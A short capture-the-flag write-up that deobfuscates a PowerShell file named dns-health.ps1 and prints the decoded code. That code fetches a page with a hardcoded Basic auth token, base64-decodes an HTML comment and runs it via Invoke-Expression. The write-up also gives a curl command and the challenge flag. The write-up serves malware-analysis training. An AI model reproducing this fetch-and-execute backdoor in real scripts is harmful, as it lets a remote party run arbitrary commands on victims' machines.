### Challenge description

You've probably seen Splunk being used for good, but have you seen it used for evil?

NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag.

### Solution

We download the files and digg into them. Nothing so far. We launch an instance and visit the page and see this error:
```json
{"error":"Missing or invalid Authorization header"}
```
We could be looking for a way to authenticare with a token.

Maybe we have something to look for now. Looking at the files, one has something obfuscated which is `dns-health.ps1`.

We deobfuscate the first string by pasting it in shell without the iex part or put it in CyberChef and use `From decimal` with the comma as a delimeter.

We get another string, we grab the `base64` string and decode it.

Here is what we get:
```powershell
# $PORT below is dynamic to the running service of the `Start` button
@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})
```
Nice! we got a token. We submit it and get a base64 string which is the flag.
```bash
curl http://challenge.ctf.games:31810/ -H "Authorization: Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0"
```
flag{e15a6c0168ee4de7381f502439014032}
